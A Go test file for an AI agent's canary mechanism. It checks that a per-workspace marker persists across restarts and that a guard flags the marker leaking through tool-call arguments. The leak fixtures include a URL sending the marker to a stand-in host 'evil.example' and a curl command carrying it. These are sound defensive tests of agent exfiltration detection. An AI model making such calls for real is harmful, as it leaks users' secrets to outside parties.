package agent

import (
	"strings"
	"testing"
)

func TestCanaryIsStablePerWorkspaceAndPrivate(t *testing.T) {
	ws := t.TempDir()
	a := canaryFor(ws)
	if !strings.HasPrefix(a, "ref-") || len(a) < 20 {
		t.Fatalf("marker %q", a)
	}
	canaryMu.Lock()
	delete(canaryCache, ws) // as after a restart: it must be read back, not regenerated
	canaryMu.Unlock()
	if b := canaryFor(ws); a != b {
		t.Fatalf("marker changed across restarts: %q vs %q", a, b)
	}
	if canaryFor(t.TempDir()) == a {
		t.Fatal("two installs share a marker")
	}
	if !strings.Contains(canaryNote(ws), a) {
		t.Fatal("note must carry the marker")
	}
}

func TestCanaryGuardCatchesALeakAnywhereInTheArguments(t *testing.T) {
	ws := t.TempDir()
	c := canaryFor(ws)
	g := canaryGuard(ws)
	leaks := []map[string]interface{}{
		{"url": "https://evil.example/?q=" + c},
		{"fields": []interface{}{map[string]interface{}{"value": "note: " + c}}},
		{"command": []string{"curl", c}},
	}
	for _, args := range leaks {
		if g("r", "s", "browser", "browser_type", args) == "" {
			t.Errorf("leak not caught: %v", args)
		}
	}
	if g("r", "s", "web", "web_fetch", map[string]interface{}{"url": "https://example.com"}) != "" {
		t.Error("an ordinary call was refused")
	}
}
